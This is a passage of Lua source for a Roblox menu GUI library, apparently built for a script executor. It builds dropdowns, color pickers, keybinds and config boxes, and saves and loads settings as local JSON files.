            gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
            gradient.Rotation = 90
            gradient.Name = "gradient"
            gradient.Parent = main

            text.Name = "text"
            text.Parent = textbox
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 7)
            text.ZIndex = 2
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left


            library.flags[args.flag] = args.value or ""
            library.options[args.flag] = {type = "textbox",changeState = function(text) box.Text = text end,skipflag = args.skipflag,oldargs = args}
        end
        function group:addDivider(args)
            groupbox.Size += UDim2.new(0, 0, 0, 10)
            
            local div = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("Frame")

            div.Name = "div"
            div.Parent = grouper
            div.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            div.BackgroundTransparency = 1.000
            div.BorderSizePixel = 0
            div.Position = UDim2.new(0, 0, 0.743662, 0)
            div.Size = UDim2.new(0, 202, 0, 10)
            
            bg.Name = "bg"
            bg.Parent = div
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.02, 0, 0, 4)
            bg.Size = UDim2.new(0, 191, 0, 1)
            
            main.Name = "main"
            main.Parent = bg
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(0, 191, 0, 1)
        end
        function group:addList(args)
            if not args.flag or not args.values then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 35)
            
--args.multiselect and "..." or ""
            library.multiZindex -= 1

            local list = Instance.new("Frame")
            local bg = Instance.new("Frame")
            local main = Instance.new("ScrollingFrame")
            local button = Instance.new("TextButton")
            local dumbtriangle = Instance.new("ImageLabel")
            local valuetext = Instance.new("TextLabel")
            local gradient = Instance.new("UIGradient")
            local text = Instance.new("TextLabel")

            local frame = Instance.new("Frame")
            local holder = Instance.new("Frame")
            local UIListLayout = Instance.new("UIListLayout")
            
            list.Name = "list"
            list.Parent = grouper
            list.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            list.BackgroundTransparency = 1.000
            list.BorderSizePixel = 0
            list.Size = UDim2.new(1, 0, 0, 35)
            list.ZIndex = library.multiZindex

            bg.Name = "bg"
            bg.Parent = list
            bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
            bg.BorderSizePixel = 2
            bg.Position = UDim2.new(0.02, -1, 0, 16)
            bg.Size = UDim2.new(0, 205, 0, 15)

            main.Name = "main"
            main.Parent = bg
            main.Active = true
            main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            main.BorderColor3 = Color3.fromRGB(60, 60, 60)
            main.Size = UDim2.new(1, 0, 1, 0)
            main.CanvasSize = UDim2.new(0, 0, 0, 0)
            main.ScrollBarThickness = 0

            button.Name = "button"
            button.Parent = main
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.Size = UDim2.new(0, 191, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

            dumbtriangle.Name = "dumbtriangle"
            dumbtriangle.Parent = main
            dumbtriangle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            dumbtriangle.BackgroundTransparency = 1.000
            dumbtriangle.BorderColor3 = Color3.fromRGB(0, 0, 0)
            dumbtriangle.BorderSizePixel = 0
            dumbtriangle.Position = UDim2.new(1, -11, 0.5, -3)
            dumbtriangle.Size = UDim2.new(0, 7, 0, 6)
            dumbtriangle.ZIndex = 3
            dumbtriangle.Image = "rbxassetid://8532000591"

            valuetext.Name = "valuetext"
            valuetext.Parent = main
            valuetext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            valuetext.BackgroundTransparency = 1.000
            valuetext.Position = UDim2.new(0.00200000009, 2, 0, 7)
            valuetext.ZIndex = 2
            valuetext.Font = Enum.Font.Code
            valuetext.Text = ""
            valuetext.TextColor3 = Color3.fromRGB(244, 244, 244)
            valuetext.TextSize = 13.000
            valuetext.TextStrokeTransparency = 0.000
            valuetext.TextXAlignment = Enum.TextXAlignment.Left

            gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
            gradient.Rotation = 90
            gradient.Name = "gradient"
            gradient.Parent = main

            text.Name = "text"
            text.Parent = list
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.0299999993, -1, 0, 7)
            text.ZIndex = 2
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left

            frame.Name = "frame"
            frame.Parent = list
            frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            frame.BorderSizePixel = 2
            frame.Position = UDim2.new(0.0299999993, -1, 0.605000019, 15)
            frame.Size = UDim2.new(0, 203, 0, 0)
            frame.Visible = false
            frame.ZIndex = library.multiZindex
            
            holder.Name = "holder"
            holder.Parent = frame
            holder.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            holder.BorderColor3 = Color3.fromRGB(60, 60, 60)
            holder.Size = UDim2.new(1, 0, 1, 0)
            
            UIListLayout.Parent = holder
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

			local function updateValue(value)
                if value == nil then valuetext.Text = "nil" return end
				if args.multiselect then
                    if type(value) == "string" then
                        if not table.find(library.options[args.flag].values,value) then return end
                        if table.find(library.flags[args.flag],value) then
                            for i,v in pairs(library.flags[args.flag]) do
                                if v == value then
                                    table.remove(library.flags[args.flag],i)
                                end
                            end
                        else
                            table.insert(library.flags[args.flag],value)
                        end
                    else
                        library.flags[args.flag] = value
                    end
					local buttonText = ""
					for i,v in pairs(library.flags[args.flag]) do
						local jig = i ~= #library.flags[args.flag] and "," or ""
						buttonText = buttonText..v..jig
					end
                    if buttonText == "" then buttonText = "..." end
					for i,v in next, holder:GetChildren() do
						if v.ClassName ~= "Frame" then continue end
						v.off.TextColor3 = Color3.new(0.65,0.65,0.65)
						for _i,_v in next, library.flags[args.flag] do
							if v.Name == _v then
								v.off.TextColor3 = Color3.new(1,1,1)
							end
						end
					end
					valuetext.Text = buttonText
					if args.callback then
						args.callback(library.flags[args.flag])
					end
				else
                    if not table.find(library.options[args.flag].values,value) then value = library.options[args.flag].values[1] end
                    library.flags[args.flag] = value
					for i,v in next, holder:GetChildren() do
						if v.ClassName ~= "Frame" then continue end
						v.off.TextColor3 = Color3.new(0.65,0.65,0.65)
                        if v.Name == library.flags[args.flag] then
                            v.off.TextColor3 = Color3.new(1,1,1)
                        end
					end
					frame.Visible = false
                    if library.flags[args.flag] then
                        valuetext.Text = library.flags[args.flag]
                        if args.callback then
                            args.callback(library.flags[args.flag])
                        end
                    end
				end
			end

            function refresh(tbl)
                for i,v in next, holder:GetChildren() do
                    if v.ClassName == "Frame" then
                        v:Destroy()
                    end
					frame.Size = UDim2.new(0, 203, 0, 0)
                end
                for i,v in pairs(tbl) do
                    frame.Size += UDim2.new(0, 0, 0, 20)

                    local option = Instance.new("Frame")
                    local button_2 = Instance.new("TextButton")
                    local text_2 = Instance.new("TextLabel")

                    option.Name = v
                    option.Parent = holder
                    option.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    option.BackgroundTransparency = 1.000
                    option.Size = UDim2.new(1, 0, 0, 20)

                    button_2.Name = "button"
                    button_2.Parent = option
                    button_2.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                    button_2.BackgroundTransparency = 0.850
                    button_2.BorderSizePixel = 0
                    button_2.Size = UDim2.new(1, 0, 1, 0)
                    button_2.Font = Enum.Font.SourceSans
                    button_2.Text = ""
                    button_2.TextColor3 = Color3.fromRGB(0, 0, 0)
                    button_2.TextSize = 14.000

                    text_2.Name = "off"
                    text_2.Parent = option
                    text_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    text_2.BackgroundTransparency = 1.000
                    text_2.Position = UDim2.new(0, 4, 0, 0)
                    text_2.Size = UDim2.new(0, 0, 1, 0)
                    text_2.Font = Enum.Font.Code
                    text_2.Text = v
                    text_2.TextColor3 = args.multiselect and Color3.new(0.65,0.65,0.65) or Color3.new(1,1,1)
                    text_2.TextSize = 14.000
                    text_2.TextStrokeTransparency = 0.000
                    text_2.TextXAlignment = Enum.TextXAlignment.Left
    
                    button_2.MouseButton1Click:Connect(function()
                        updateValue(v)
                    end)
                end
                library.options[args.flag].values = tbl
                updateValue(table.find(library.options[args.flag].values,library.flags[args.flag]) and library.flags[args.flag] or library.options[args.flag].values[1])
            end

            button.MouseButton1Click:Connect(function()
                if not library.colorpicking then
                    frame.Visible = not frame.Visible
                end
            end)
            button.MouseEnter:connect(function()
                main.BorderColor3 = library.libColor
			end)
			button.MouseLeave:connect(function()
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
			end)
            
            table.insert(library.toInvis,frame)
            library.flags[args.flag] = args.multiselect and {} or ""
            library.options[args.flag] = {type = "list",changeState = updateValue,values = args.values,refresh = refresh,skipflag = args.skipflag,oldargs = args}

            refresh(args.values)
            updateValue(args.value or not args.multiselect and args.values[1] or "abcdefghijklmnopqrstuwvxyz")
        end
        function group:addConfigbox(args)
            if not args.flag or not args.values then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 138)
            library.multiZindex -= 1
            
            local list2 = Instance.new("Frame")
            local frame = Instance.new("Frame")
            local main = Instance.new("Frame")
            local holder = Instance.new("ScrollingFrame")
            local UIListLayout = Instance.new("UIListLayout")
            local dwn = Instance.new("ImageLabel")
            local up = Instance.new("ImageLabel")
        
            list2.Name = "list2"
            list2.Parent = grouper
            list2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            list2.BackgroundTransparency = 1.000
            list2.BorderSizePixel = 0
            list2.Position = UDim2.new(0, 0, 0.108108111, 0)
            list2.Size = UDim2.new(1, 0, 0, 138)
            
            frame.Name = "frame"
            frame.Parent = list2
            frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            frame.BorderSizePixel = 2
            frame.Position = UDim2.new(0.02, -1, 0.0439999998, 0)
            frame.Size = UDim2.new(0, 205, 0, 128)
            
            main.Name = "main"
            main.Parent = frame
            main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            main.BorderColor3 = Color3.fromRGB(30,30,30)
            main.Size = UDim2.new(1, 0, 1, 0)
            
            holder.Name = "holder"
            holder.Parent = main
            holder.Active = true
            holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            holder.BackgroundTransparency = 1.000
            holder.BorderSizePixel = 0
            holder.Position = UDim2.new(0, 0, 0.00571428565, 0)
            holder.Size = UDim2.new(1, 0, 1, 0)
            holder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
            holder.CanvasSize = UDim2.new(0, 0, 0, 0)
            holder.ScrollBarThickness = 0
            holder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
            holder.AutomaticCanvasSize = Enum.AutomaticSize.Y
            holder.ScrollingEnabled = true
            holder.ScrollBarImageTransparency = 0
            
            UIListLayout.Parent = holder
            
            dwn.Name = "dwn"
            dwn.Parent = frame
            dwn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            dwn.BackgroundTransparency = 1.000
            dwn.BorderColor3 = Color3.fromRGB(0, 0, 0)
            dwn.BorderSizePixel = 0
            dwn.Position = UDim2.new(0.930000007, 4, 1, -9)
            dwn.Size = UDim2.new(0, 7, 0, 6)
            dwn.ZIndex = 3
            dwn.Image = "rbxassetid://8548723563"
            dwn.Visible = false
            
            up.Name = "up"
            up.Parent = frame
            up.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            up.BackgroundTransparency = 1.000
            up.BorderColor3 = Color3.fromRGB(0, 0, 0)
            up.BorderSizePixel = 0
            up.Position = UDim2.new(0, 3, 0, 3)
            up.Size = UDim2.new(0, 7, 0, 6)
            up.ZIndex = 3
            up.Image = "rbxassetid://8548757311"
            up.Visible = false

            local function updateValue(value)
                if value == nil then return end
                if not table.find(library.options[args.flag].values,value) then value = library.options[args.flag].values[1] end
                library.flags[args.flag] = value
        
                for i,v in next, holder:GetChildren() do
                    if v.ClassName ~= "Frame" then continue end
                    if v.text.Text == library.flags[args.flag] then
                        v.text.TextColor3 = library.libColor
                    else
                        v.text.TextColor3 = Color3.fromRGB(255,255,255)
                    end
                end
                if library.flags[args.flag] then
                    if args.callback then
                        args.callback(library.flags[args.flag])
                    end
                end
                holder.Visible = true
            end
            holder:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
                up.Visible = (holder.CanvasPosition.Y > 1)
                dwn.Visible = (holder.CanvasPosition.Y + 1 < (holder.AbsoluteCanvasSize.Y - holder.AbsoluteSize.Y))
            end)
        
        
            function refresh(tbl)
                for i,v in next, holder:GetChildren() do
                    if v.ClassName == "Frame" then
                        v:Destroy()
                    end
                end
                for i,v in pairs(tbl) do
                    local item = Instance.new("Frame")
                    local button = Instance.new("TextButton")
                    local text = Instance.new("TextLabel")
        
                    item.Name = v
                    item.Parent = holder
                    item.Active = true
                    item.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    item.BackgroundTransparency = 1.000
                    item.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    item.BorderSizePixel = 0
                    item.Size = UDim2.new(1, 0, 0, 18)
                    
                    button.Parent = item
                    button.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                    button.BackgroundTransparency = 1
                    button.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    button.BorderSizePixel = 0
                    button.Size = UDim2.new(1, 0, 1, 0)
                    button.Text = ""
                    button.TextTransparency = 1.000
                    
                    text.Name = 'text'
                    text.Parent = item
                    text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    text.BackgroundTransparency = 1.000
                    text.Size = UDim2.new(1, 0, 0, 18)
                    text.Font = Enum.Font.Code
                    text.Text = v
                    text.TextColor3 = Color3.fromRGB(255, 255, 255)
                    text.TextSize = 14.000
                    text.TextStrokeTransparency = 0.000
        
                    button.MouseButton1Click:Connect(function()
                        updateValue(v)
                    end)
                end
        
                holder.Visible = true
                library.options[args.flag].values = tbl
                updateValue(table.find(library.options[args.flag].values,library.flags[args.flag]) and library.flags[args.flag] or library.options[args.flag].values[1])
            end
        
        
            library.flags[args.flag] = ""
            library.options[args.flag] = {type = "cfg",changeState = updateValue,values = args.values,refresh = refresh,skipflag = args.skipflag,oldargs = args}
        
            refresh(args.values)
            updateValue(args.value or not args.multiselect and args.values[1] or "abcdefghijklmnopqrstuwvxyz")
        end
        function group:addColorpicker(args)
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
            groupbox.Size += UDim2.new(0, 0, 0, 20)
        
            library.multiZindex -= 1
            jigCount -= 1
            topStuff -= 1

            local colorpicker = Instance.new("Frame")
            local back = Instance.new("Frame")
            local mid = Instance.new("Frame")
            local front = Instance.new("Frame")
            local text = Instance.new("TextLabel")
            local colorpicker_2 = Instance.new("Frame")
            local button = Instance.new("TextButton")

            local colorFrame = Instance.new("Frame")
			local colorFrame_2 = Instance.new("Frame")
			local hueframe = Instance.new("Frame")
			local main = Instance.new("Frame")
			local hue = Instance.new("ImageLabel")
			local pickerframe = Instance.new("Frame")
			local main_2 = Instance.new("Frame")
			local picker = Instance.new("ImageLabel")
			local clr = Instance.new("Frame")
			local copy = Instance.new("TextButton")

            colorpicker.Name = "colorpicker"
            colorpicker.Parent = grouper
            colorpicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            colorpicker.BackgroundTransparency = 1.000
            colorpicker.BorderSizePixel = 0
            colorpicker.Size = UDim2.new(1, 0, 0, 20)
            colorpicker.ZIndex = topStuff

            text.Name = "text"
            text.Parent = colorpicker
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.02, -1, 0, 10)
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left

            button.Name = "button"
            button.Parent = colorpicker
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Size = UDim2.new(1, 0, 1, 0)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

            colorpicker_2.Name = "colorpicker"
            colorpicker_2.Parent = colorpicker
            colorpicker_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            colorpicker_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            colorpicker_2.BorderSizePixel = 3
            colorpicker_2.Position = UDim2.new(0.860000014, 4, 0.272000015, 0)
            colorpicker_2.Size = UDim2.new(0, 20, 0, 10)

            mid.Name = "mid"
            mid.Parent = colorpicker_2
            mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
            mid.BorderColor3 = Color3.fromRGB(30,30,30)
            mid.BorderSizePixel = 2
            mid.Size = UDim2.new(1, 0, 1, 0)

            front.Name = "front"
            front.Parent = mid
            front.BackgroundColor3 = Color3.fromRGB(240, 142, 214)
            front.BorderColor3 = Color3.fromRGB(0, 0, 0)
            front.Size = UDim2.new(1, 0, 1, 0)

            button.Name = "button"
            button.Parent = colorpicker
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.BackgroundTransparency = 1.000
            button.Size = UDim2.new(0, 202, 0, 22)
            button.Font = Enum.Font.SourceSans
            button.Text = ""
			button.ZIndex = args.ontop and topStuff or jigCount
            button.TextColor3 = Color3.fromRGB(0, 0, 0)
            button.TextSize = 14.000

			colorFrame.Name = "colorFrame"
			colorFrame.Parent = colorpicker
			colorFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
			colorFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
			colorFrame.BorderSizePixel = 2
			colorFrame.Position = UDim2.new(0.101092957, 0, 0.75, 0)
			colorFrame.Size = UDim2.new(0, 137, 0, 128)

			colorFrame_2.Name = "colorFrame"
			colorFrame_2.Parent = colorFrame
			colorFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
			colorFrame_2.BorderColor3 = Color3.fromRGB(60, 60, 60)
			colorFrame_2.Size = UDim2.new(1, 0, 1, 0)

			hueframe.Name = "hueframe"
			hueframe.Parent = colorFrame_2
            hueframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            hueframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
            hueframe.BorderSizePixel = 2
            hueframe.Position = UDim2.new(-0.0930000022, 18, -0.0599999987, 30)
            hueframe.Size = UDim2.new(0, 100, 0, 100)

            main.Name = "main"
            main.Parent = hueframe
            main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            main.BorderColor3 = Color3.fromRGB(0, 0, 0)
            main.Size = UDim2.new(0, 100, 0, 100)
            main.ZIndex = 6

            picker.Name = "picker"
            picker.Parent = main
            picker.BackgroundColor3 = Color3.fromRGB(232, 0, 255)
            picker.BorderColor3 = Color3.fromRGB(0, 0, 0)
            picker.BorderSizePixel = 0
            picker.Size = UDim2.new(0, 100, 0, 100)
            picker.ZIndex = 104
            picker.Image = "rbxassetid://2615689005"

            pickerframe.Name = "pickerframe"
            pickerframe.Parent = colorFrame
            pickerframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            pickerframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
            pickerframe.BorderSizePixel = 2
            pickerframe.Position = UDim2.new(0.711000025, 14, -0.0599999987, 30)
            pickerframe.Size = UDim2.new(0, 20, 0, 100)

            main_2.Name = "main"
            main_2.Parent = pickerframe
            main_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            main_2.Size = UDim2.new(0, 20, 0, 100)
            main_2.ZIndex = 6

            hue.Name = "hue"
            hue.Parent = main_2
            hue.BackgroundColor3 = Color3.fromRGB(255, 0, 178)
            hue.BorderColor3 = Color3.fromRGB(0, 0, 0)
            hue.BorderSizePixel = 0
            hue.Size = UDim2.new(0, 20, 0, 100)
            hue.ZIndex = 104
            hue.Image = "rbxassetid://2615692420"

            clr.Name = "clr"
            clr.Parent = colorFrame
            clr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            clr.BackgroundTransparency = 1.000
            clr.BorderColor3 = Color3.fromRGB(60, 60, 60)
            clr.BorderSizePixel = 2
            clr.Position = UDim2.new(0.0280000009, 0, 0, 2)
            clr.Size = UDim2.new(0, 129, 0, 14)
            clr.ZIndex = 5

            copy.Name = "copy"
            copy.Parent = clr
            copy.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            copy.BackgroundTransparency = 1.000
            copy.BorderSizePixel = 0
            copy.Size = UDim2.new(0, 129, 0, 14)
            copy.ZIndex = 5
            copy.Font = Enum.Font.Code
            copy.Text = args.text or args.flag
            copy.TextColor3 = Color3.fromRGB(100, 100, 100)
            copy.TextSize = 14.000
            copy.TextStrokeTransparency = 0.000
            
            copy.MouseButton1Click:Connect(function()
                colorFrame.Visible = false
            end)

            button.MouseButton1Click:Connect(function()
				colorFrame.Visible = not colorFrame.Visible
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
            end)

            button.MouseEnter:connect(function()
                mid.BorderColor3 = library.libColor
            end)
            button.MouseLeave:connect(function()
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
            end)

            local function updateValue(value,fakevalue)
                if typeof(value) == "table" then value = fakevalue end
                library.flags[args.flag] = value
                front.BackgroundColor3 = value
                if args.callback then
                    args.callback(value)
                end
			end

            local white, black = Color3.new(1,1,1), Color3.new(0,0,0)
            local colors = {Color3.new(1,0,0),Color3.new(1,1,0),Color3.new(0,1,0),Color3.new(0,1,1),Color3.new(0,0,1),Color3.new(1,0,1),Color3.new(1,0,0)}
            local heartbeat = game:GetService("RunService").Heartbeat

            local pickerX,pickerY,hueY = 0,0,0
            local oldpercentX,oldpercentY = 0,0

            hue.MouseEnter:Connect(function()
                local input = hue.InputBegan:connect(function(key)
                    if key.UserInputType == Enum.UserInputType.MouseButton1 then
                        while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                            library.colorpicking = true
                            local percent = (hueY-hue.AbsolutePosition.Y-36)/hue.AbsoluteSize.Y
                            local num = math.max(1, math.min(7,math.floor(((percent*7+0.5)*100))/100))
                            local startC = colors[math.floor(num)]
                            local endC = colors[math.ceil(num)]
                            local color = white:lerp(picker.BackgroundColor3, oldpercentX):lerp(black, oldpercentY)
                            picker.BackgroundColor3 = startC:lerp(endC, num-math.floor(num)) or Color3.new(0, 0, 0)
                            updateValue(color)
                        end
                        library.colorpicking = false
                    end
                end)
                local leave
                leave = hue.MouseLeave:connect(function()
                    input:disconnect()
                    leave:disconnect()
                end)
            end)

            picker.MouseEnter:Connect(function()
                local input = picker.InputBegan:connect(function(key)
                    if key.UserInputType == Enum.UserInputType.MouseButton1 then
                        while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                            library.colorpicking = true
                            local xPercent = (pickerX-picker.AbsolutePosition.X)/picker.AbsoluteSize.X
                            local yPercent = (pickerY-picker.AbsolutePosition.Y-36)/picker.AbsoluteSize.Y
                            local color = white:lerp(picker.BackgroundColor3, xPercent):lerp(black, yPercent)
                            updateValue(color)
                            oldpercentX,oldpercentY = xPercent,yPercent
                        end
                        library.colorpicking = false
                    end
                end)
                local leave
                leave = picker.MouseLeave:connect(function()
                    input:disconnect()
                    leave:disconnect()
                end)
            end)

            hue.MouseMoved:connect(function(_, y)
                hueY = y
            end)

            picker.MouseMoved:connect(function(x, y)
                pickerX,pickerY = x,y
            end)

            table.insert(library.toInvis,colorFrame)
            library.flags[args.flag] = Color3.new(1,1,1)
            library.options[args.flag] = {type = "colorpicker",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

            updateValue(args.color or Color3.new(1,1,1))
        end
        function group:addKeybind(args)
            if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on toggle:keybind") end
            groupbox.Size += UDim2.new(0, 0, 0, 20)
            local next = false
            
            local keybind = Instance.new("Frame")
            local text = Instance.new("TextLabel")
            local button = Instance.new("TextButton")

            keybind.Parent = grouper
            keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            keybind.BackgroundTransparency = 1.000
            keybind.BorderSizePixel = 0
            keybind.Size = UDim2.new(1, 0, 0, 20)
            
            text.Parent = keybind
            text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            text.BackgroundTransparency = 1.000
            text.Position = UDim2.new(0.02, -1, 0, 10)
            text.Font = Enum.Font.Code
            text.Text = args.text or args.flag
            text.TextColor3 = Color3.fromRGB(244, 244, 244)
            text.TextSize = 13.000
            text.TextStrokeTransparency = 0.000
            text.TextXAlignment = Enum.TextXAlignment.Left
            
            button.Parent = keybind
            button.BackgroundColor3 = Color3.fromRGB(187, 131, 255)
            button.BackgroundTransparency = 1.000
            button.BorderSizePixel = 0
            button.Position = UDim2.new(7.09711117e-08, 0, 0, 0)
            button.Size = UDim2.new(0.02, 0, 1, 0)
            button.Font = Enum.Font.Code
            button.Text = "--"
            button.TextColor3 = Color3.fromRGB(155, 155, 155)
            button.TextSize = 13.000
            button.TextStrokeTransparency = 0.000
            button.TextXAlignment = Enum.TextXAlignment.Right

            function updateValue(val)
                if library.colorpicking then return end
                library.flags[args.flag] = val
                button.Text = keyNames[val] or val.Name
            end
            inputService.InputBegan:Connect(function(key)
                local key = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
                if next then
                    if not table.find(library.blacklisted,key) then
                        next = false
                        library.flags[args.flag] = key
                        button.Text = keyNames[key] or key.Name
                        button.TextColor3 = Color3.fromRGB(155, 155, 155)
                    end
                end
                if not next and key == library.flags[args.flag] and args.callback then
                    args.callback()
                end
            end)

            button.MouseButton1Click:Connect(function()
                if library.colorpicking then return end
                library.flags[args.flag] = Enum.KeyCode.Unknown
                button.Text = "..."
                button.TextColor3 = Color3.new(0.2,0.2,0.2)
                next = true
            end)

            library.flags[args.flag] = Enum.KeyCode.Unknown
            library.options[args.flag] = {type = "keybind",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

            updateValue(args.key or Enum.KeyCode.Unknown)
        end
        return group, groupbox
    end
    return tab
end

function contains(list, x)
	for _, v in pairs(list) do
		if v == x then return true end
	end
	return false
end

function library:createConfig()
    local name = library.flags["config_name"]
    if contains(library.options["selected_config"].values, name) then return library:notify(name..".cfg already exists!") end
    if name == "" then return library:notify("Put a name kid") end
    local jig = {}
    for i,v in next, library.flags do
        if library.options[i].skipflag then continue end
        if typeof(v) == "Color3" then
            jig[i] = {v.R,v.G,v.B}
        elseif typeof(v) == "EnumItem" then
            jig[i] = {string.split(tostring(v),".")[2],string.split(tostring(v),".")[3]}
        else
            jig[i] = v
        end
    end
    writefile("hellhoundCFGS/"..name..".cfg",game:GetService("HttpService"):JSONEncode(jig))
    library:notify("Succesfully created config "..name..".cfg!")
    library:refreshConfigs()
end

function library:saveConfig()
    local name = library.flags["selected_config"]
    local jig = {}
    for i,v in next, library.flags do
        if library.options[i].skipflag then continue end
        if typeof(v) == "Color3" then
            jig[i] = {v.R,v.G,v.B}
        elseif typeof(v) == "EnumItem" then
            jig[i] = {string.split(tostring(v),".")[2],string.split(tostring(v),".")[3]}
        else
            jig[i] = v
        end
    end
    writefile("hellhoundCFGs/"..name..".cfg",game:GetService("HttpService"):JSONEncode(jig))
    library:notify("Succesfully updated config "..name..".cfg!")
    library:refreshConfigs()
end

function library:loadConfig()
    local name = library.flags["selected_config"]
    if not isfile("hellhoundCFGs/"..name..".cfg") then
        library:notify("Config file not found!")
        return
    end
    local config = game:GetService("HttpService"):JSONDecode(readfile("hellhoundCFGs/"..name..".cfg"))
    for i,v in next, library.options do
        spawn(function()pcall(function()
            if config[i] then
                if v.type == "colorpicker" then
                    v.changeState(Color3.new(config[i][1],config[i][2],config[i][3]))
                elseif v.type == "keybind" then
                    v.changeState(Enum[config[i][1]][config[i][2]])
                else
                    if config[i] ~= library.flags[i] then
                        v.changeState(config[i])
                    end
                end
            else
                if v.type == "toggle" then
                    v.changeState(false)
                elseif v.type == "slider" then
                    v.changeState(v.args.value or 0)
                elseif v.type == "textbox" or v.type == "list" or v.type == "cfg" then
                    v.changeState(v.args.value or v.args.text or "")
                elseif v.type == "colorpicker" then
                    v.changeState(v.args.color or Color3.new(1,1,1))
                elseif option.type == "list" then
                    v.changeState("")
                elseif option.type == "keybind" then
                    v.changeState(v.args.key or Enum.KeyCode.Unknown)
                end
            end
        end)end)
    end
